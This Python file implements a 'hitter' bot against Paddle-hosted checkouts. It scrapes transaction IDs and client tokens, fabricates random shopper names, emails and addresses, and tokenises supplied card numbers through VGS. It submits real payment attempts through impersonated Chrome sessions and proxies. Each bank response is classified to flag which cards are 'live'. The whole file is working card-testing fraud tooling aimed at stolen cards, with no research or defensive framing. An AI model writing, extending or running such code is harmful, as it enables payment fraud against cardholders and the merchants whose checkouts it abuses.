"""
Paddle Payment Engine (gokuhitter_bot)
─────────────────────────────────────
Full Paddle v2 checkout scraper (pay.paddle.io / buy.paddle.com), transaction manifest resolution,
and checkout payment execution with TLS browser impersonation.
"""

import re
import json
import time
import random
import uuid
import urllib.parse
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

GLOBAL_SHOPPERS = {
    'US': {
        'first_names': ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Ava'],
        'last_names': ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor', 'Moore'],
        'cities': [('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'), ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'), ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'), ('Austin', 'TX', '78701')],
        'streets': ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St'],
        'phone_prefix': '+1',
    },
    'GB': {
        'first_names': ['Oliver', 'George', 'Harry', 'Noah', 'Jack', 'Leo', 'Arthur', 'Oscar', 'Olivia', 'Amelia', 'Isla', 'Ava', 'Mia', 'Lily', 'Sophia', 'Grace'],
        'last_names': ['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies', 'Robinson', 'Wright', 'Thompson', 'Evans', 'Walker', 'White'],
        'cities': [('London', 'Greater London', 'EC1A 1BB'), ('Manchester', 'Greater Manchester', 'M1 1AE'), ('Birmingham', 'West Midlands', 'B1 1AA'), ('Leeds', 'West Yorkshire', 'LS1 1UR'), ('Glasgow', 'Scotland', 'G1 1XQ'), ('Liverpool', 'Merseyside', 'L1 8JQ'), ('Bristol', 'Bristol', 'BS1 4ST')],
        'streets': ['High Street', 'Station Road', 'Main Street', 'Church Lane', 'Victoria Road', 'Green Lane', 'Manor Road', 'Park Road', 'Queen Street'],
        'phone_prefix': '+44',
    },
    'DE': {
        'first_names': ['Lukas', 'Maximilian', 'Paul', 'Felix', 'Jonas', 'Leon', 'Finn', 'Noah', 'Elias', 'Emma', 'Mia', 'Hannah', 'Sophia', 'Anna', 'Emilia', 'Marie'],
        'last_names': ['Müller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner', 'Becker', 'Schulz', 'Hoffmann', 'Schäfer', 'Koch', 'Bauer', 'Richter'],
        'cities': [('Berlin', 'Berlin', '10115'), ('Munich', 'Bavaria', '80331'), ('Hamburg', 'Hamburg', '20095'), ('Frankfurt', 'Hesse', '60311'), ('Cologne', 'North Rhine-Westphalia', '50667'), ('Stuttgart', 'Baden-Württemberg', '70173'), ('Düsseldorf', 'North Rhine-Westphalia', '40213')],
        'streets': ['Hauptstraße', 'Bahnhofstraße', 'Schillerstraße', 'Goethestraße', 'Berliner Straße', 'Gartenstraße', 'Bismarckstraße', 'Kirchstraße'],
        'phone_prefix': '+49',
    },
    'FR': {
        'first_names': ['Gabriel', 'Léo', 'Raphaël', 'Louis', 'Lucas', 'Adam', 'Arthur', 'Hugo', 'Jade', 'Louise', 'Emma', 'Alice', 'Ambre', 'Lina', 'Rose', 'Chloé'],
        'last_names': ['Martin', 'Bernard', 'Dubois', 'Thomas', 'Robert', 'Richard', 'Petit', 'Durand', 'Leroy', 'Moreau', 'Simon', 'Laurent', 'Lefebvre', 'Michel'],
        'cities': [('Paris', 'Île-de-France', '75001'), ('Marseille', 'Provence-Alpes-Côte d\'Azur', '13001'), ('Lyon', 'Auvergne-Rhône-Alpes', '69001'), ('Toulouse', 'Occitanie', '31000'), ('Nice', 'Provence-Alpes-Côte d\'Azur', '06000'), ('Nantes', 'Pays de la Loire', '44000')],
        'streets': ['Rue de la Paix', 'Boulevard Saint-Germain', 'Avenue Victor Hugo', 'Rue de Rivoli', 'Rue Nationale', 'Avenue des Champs-Élysées', 'Rue de la République'],
        'phone_prefix': '+33',
    },
}

DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']

def _generate_random_shopper(country_code: Optional[str] = 'US') -> dict:
    if not country_code or country_code.upper() not in GLOBAL_SHOPPERS:
        country_code = 'US'
    else:
        country_code = country_code.upper()
        
    data = GLOBAL_SHOPPERS[country_code]
    first = random.choice(data['first_names'])
    last = random.choice(data['last_names'])
    num = random.randint(10, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    
    city, state, zip_code = random.choice(data['cities'])
    street_name = random.choice(data['streets'])
    house_num = str(random.randint(10, 999))
    street = f"{house_num} {street_name}"
    phone = f"{data['phone_prefix']}{random.randint(2000000000, 9999999999)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code
    }

class PaddleHitter:
    """Paddle Hosted Checkout & Billing Gateway Engine."""

    DECLINE_MAP = {
        "declined": "card_declined",
        "insufficient_funds": "insufficient_funds",
        "insufficient funds": "insufficient_funds",
        "do not honor": "do_not_honor",
        "do_not_honor": "do_not_honor",
        "incorrect cvc": "incorrect_cvc",
        "invalid cvc": "incorrect_cvc",
        "expired card": "expired_card",
        "invalid card": "invalid_number",
        "cvv declined": "incorrect_cvc",
        "cvc declined": "incorrect_cvc",
        "fraud": "fraud",
        "suspected fraud": "fraud",
        "restricted card": "restricted_card",
        "issuer unavailable": "issuer_unavailable",
        "unable to take payment": "card_declined",
        "declined by your bank": "card_declined",
        "do not honor": "do_not_honor",
        "not permitted": "not_permitted",
        "blocked": "card_blocked",
        "lost card": "lost_stolen",
        "stolen card": "lost_stolen",
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        return "https://pay.paddle.io"

    async def _scrape(self, session: ChromeSession) -> dict:
        """Extracts Paddle transaction ID, client token, seller metadata and pricing."""
        hdr = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        cfg = {
            'merchant': 'Paddle Merchant',
            'amount': None,
            'currency': 'USD',
            'transaction_id': None,
            'client_token': None,
            'checkout_id': None,
            'vgs_jwt': None,
            'is_paddle': False,
        }

        if any(d in self.url.lower() for d in ['paddle.io', 'paddle.com', 'buy.paddle', 'pay.paddle']):
            cfg['is_paddle'] = True

        parsed_q = parse_qs(urlparse(self.url).query)
        if '_ptxn' in parsed_q:
            cfg['transaction_id'] = parsed_q['_ptxn'][0]
        elif 'txn' in parsed_q:
            cfg['transaction_id'] = parsed_q['txn'][0]

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text
            
            # Extract client token & transaction ID from RSC chunks or HTML
            m_token = re.search(r'clientToken[\\]*["\']?\s*:\s*[\\]*["\'](live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)', html) or \
                      re.search(r'(live_[a-f0-9]{25,45}|test_[a-f0-9]{25,45})', html)
            if m_token:
                cfg['client_token'] = m_token.group(1)

            if not cfg['transaction_id']:
                m_txn = re.search(r'(txn_[A-Za-z0-9_]{15,35})', html)
                if m_txn:
                    cfg['transaction_id'] = m_txn.group(1)

        # Initialize Paddle Checkout Manifest
        if cfg.get('transaction_id') and cfg.get('client_token'):
            try:
                init_url = "https://checkout-service.paddle.com/transaction-checkout/paddlejs"
                headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": UA,
                    "Origin": "https://buy.paddle.com",
                    "Referer": f"https://buy.paddle.com/?_ptxn={cfg['transaction_id']}",
                    "Paddle-Clienttoken": cfg['client_token'],
                    "Correlation-ID": str(uuid.uuid4()),
                }
                data_payload = {
                    "data": {
                        "transaction_id": cfg['transaction_id'],
                        "settings": {
                            "source_page": self.url
                        }
                    }
                }
                async with session.post(init_url, json=data_payload, headers=headers, timeout=10) as r_init:
                    if r_init.status_code == 200:
                        init_json = r_init.json().get('data', {})
                        cfg['checkout_id'] = init_json.get('id')
                        
                        seller_name = init_json.get('seller', {}).get('name')
                        items = init_json.get('items', [])
                        item_name = items[0].get('product', {}).get('name') if items else None
                        
                        cfg['merchant'] = seller_name or item_name or 'Paddle Merchant'
                        totals = init_json.get('totals', {})
                        total_amt = totals.get('total') or totals.get('subtotal')
                        curr = init_json.get('currency_code', 'USD')
                        
                        if total_amt:
                            cfg['currency'] = curr
                            cfg['amount'] = f"{curr} {float(total_amt):.2f}"
                        
                        # Extract VGS JWT from payment methods
                        methods = init_json.get('payments', {}).get('methods_available', [])
                        for m in methods:
                            if m.get('tokenization_provider') == 'vgs':
                                vgs_opts = m.get('vgs_options', {})
                                cfg['vgs_jwt'] = vgs_opts.get('jwt')
                                break
            except Exception:
                pass

        return cfg

    async def _get_config(self, session: ChromeSession) -> dict:
        # Always re-scrape — checkout_id/vgs_jwt are single-use session tokens
        return await self._scrape(session)

    def _parse_response(self, text: str, status_code: int, result: dict) -> dict:
        """Parses Paddle checkout response for receipt confirmation or decline reason."""
        try:
            d = json.loads(text)
            if isinstance(d, dict):
                result['raw_response'] = d
                data = d.get('data', {})
                status = data.get('status') or d.get('status')
                
                # Succeeded / Completed status
                if status in ('completed', 'succeeded', 'paid', 'active') or d.get('success') is True:
                    result['success'] = True
                    result['receipt_url'] = data.get('receipt_url') or self.url
                    return result

                # 3DS / Requires Action status
                if status in ('requires_action', 'requires_source_action') or 'action' in data or 'three_d_s' in data:
                    result['decline_code'] = '3ds_required'
                    result['error'] = '3DS Authentication Required'
                    result['is_live'] = True
                    act = data.get('action', {})
                    redirect_url = act.get('url') or act.get('redirect_url')
                    if redirect_url:
                        result['redirect_url'] = redirect_url
                    return result

                # Decline / Validation errors
                errors = d.get('errors', [])
                if errors and isinstance(errors, list):
                    first_err = errors[0]
                    detail = first_err.get('details') or first_err.get('message') or first_err.get('code') or 'Card declined'
                    dec_code = 'card_declined'
                    for k, v in self.DECLINE_MAP.items():
                        if k in detail.lower():
                            dec_code = v
                            break
                    result['decline_code'] = dec_code
                    result['error'] = detail
                    # Any real bank-level response is live — bank decline means card is real
                    result['is_live'] = True
                    return result
        except Exception:
            pass

        text_low = text.lower()
        if any(term in text_low for term in ['payment successful', 'order confirmed', 'thank you for your purchase', 'payment approved']):
            result['success'] = True
            return result

        if any(term in text_low for term in ['3d secure', '3ds', 'requires_action', 'authenticate']):
            result['decline_code'] = '3ds_required'
            result['error'] = '3DS Authentication Required'
            result['is_live'] = True
            return result

        if 'insufficient funds' in text_low:
            result['decline_code'] = 'insufficient_funds'
            result['error'] = 'insufficient_funds'
            result['is_live'] = True
            return result

        if 'cvc' in text_low or 'cvv' in text_low:
            result['decline_code'] = 'incorrect_cvc'
            result['error'] = 'incorrect_cvc'
            result['is_live'] = True
            return result

        result['decline_code'] = 'card_declined'
        result['error'] = 'Your card was declined.'
        return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        """Executes payment attempt against Paddle checkout system."""
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Paddle Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                cfg = await self._get_config(sess)
                result['merchant'] = cfg.get('merchant', 'Paddle Merchant')
                if cfg.get('amount'):
                    result['amount'] = cfg['amount']

                if not cfg.get('is_paddle') and 'paddle' not in self.url.lower():
                    result['error'] = "No Paddle checkout gateway detected on this page"
                    result['decline_code'] = 'no_paddle'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                shopper = _generate_random_shopper(cfg.get('currency', 'USD')[:2] if cfg.get('currency') in ('US', 'GB', 'DE', 'FR') else 'US')
                
                clean_card = re.sub(r'\D', '', str(card['card']))
                clean_m = re.sub(r'\D', '', str(card.get('month', '1')))
                exp_month_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
                
                clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
                if len(clean_y) == 2:
                    exp_year_int = int(f"20{clean_y}")
                else:
                    exp_year_int = int(clean_y) if clean_y else 2028

                # 1. Paddle Checkout Service Pipeline
                if cfg.get('checkout_id') and cfg.get('client_token'):
                    che_id = cfg['checkout_id']
                    headers = {
                        "Content-Type": "application/json",
                        "Accept": "application/json",
                        "User-Agent": UA,
                        "Origin": "https://buy.paddle.com",
                        "Referer": f"https://buy.paddle.com/?_ptxn={cfg.get('transaction_id', '')}",
                        "Paddle-Clienttoken": cfg['client_token'],
                        "Correlation-ID": str(uuid.uuid4()),
                    }

                    # Step A: Register Customer — await body to confirm 201 before pay
                    url_cust = f"https://checkout-service.paddle.com/transaction-checkout/{che_id}/customer"
                    cust_payload = {
                        "data": {
                            "customer": {
                                "email": shopper['email'],
                                "marketing_consent": False,
                                "address": {
                                    "country_code": shopper['country'],
                                    "postal_code": shopper['postal_code']
                                }
                            }
                        }
                    }
                    try:
                        async with sess.post(url_cust, json=cust_payload, headers=headers, timeout=8) as r_c:
                            _ = r_c.text()  # Read body to ensure full round-trip
                    except Exception:
                        pass

                    # Step B: Tokenize Card via VGS vault → get card_id
                    card_id = None
                    vgs_jwt = cfg.get('vgs_jwt')
                    if vgs_jwt:
                        try:
                            vgs_hdr = {
                                "Authorization": f"Bearer {vgs_jwt}",
                                "Content-Type": "application/vnd.api+json",
                                "Accept": "application/vnd.api+json",
                                "User-Agent": UA,
                                "Origin": "https://buy.paddle.com",
                                "Referer": "https://buy.paddle.com/",
                            }
                            vgs_payload = {
                                "data": {
                                    "type": "cards",
                                    "attributes": {
                                        "pan": clean_card,
                                        "cvc": str(card.get('cvv', '')),
                                        "exp_month": exp_month_int,
                                        "exp_year": exp_year_int % 100,  # 2-digit year
                                        "cardholder": {"name": shopper['full_name']}
                                    }
                                }
                            }
                            async with sess.post("https://vgsapi.com/cards", json=vgs_payload, headers=vgs_hdr, timeout=10) as r_vgs:
                                if r_vgs.status_code in (200, 201):
                                    vgs_data = r_vgs.json()
                                    card_id = vgs_data.get('data', {}).get('id')
                        except Exception:
                            pass

                    if not card_id:
                        result['response_time'] = round(time.time() - t0, 2)
                        result['decline_code'] = 'tokenization_failed'
                        result['error'] = 'VGS card tokenization failed'
                        return result

                    # Step C: Submit Payment with VGS card_id
                    url_pay = f"https://checkout-service.paddle.com/transaction-checkout/{che_id}/pay"
                    pay_payload = {
                        "data": {
                            "payment_method_type": "card",
                            "payment_method_data": {
                                "card": {
                                    "metadata": {
                                        "cardholder_name": shopper['full_name'],
                                        "card_first_six": clean_card[:6],
                                        "card_last_four": clean_card[-4:],
                                        "expiry_month": exp_month_int,
                                        "expiry_year": exp_year_int,
                                        "card_brand": "visa" if clean_card.startswith('4') else "mastercard"
                                    },
                                    "three_d_s": {
                                        "browser_info": json.dumps({
                                            "accept_header": "application/json",
                                            "color_depth": 24,
                                            "java_enabled": False,
                                            "language": "en-US",
                                            "screen_height": 1080,
                                            "screen_width": 1920,
                                            "time_zone_offset": 0
                                        })
                                    },
                                    "vgs_card": {"card_id": card_id}
                                }
                            }
                        }
                    }
                    
                    try:
                        async with sess.post(url_pay, json=pay_payload, headers=headers, timeout=15) as r_pay:
                            pay_resp = r_pay.text() if callable(r_pay.text) else r_pay.text
                            result['response_time'] = round(time.time() - t0, 2)
                            return self._parse_response(pay_resp, r_pay.status_code, result)
                    except Exception:
                        pass

                # Fallback response
                result['response_time'] = round(time.time() - t0, 2)
                result['decline_code'] = 'card_declined'
                result['error'] = 'Your card was declined.'
                return result

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
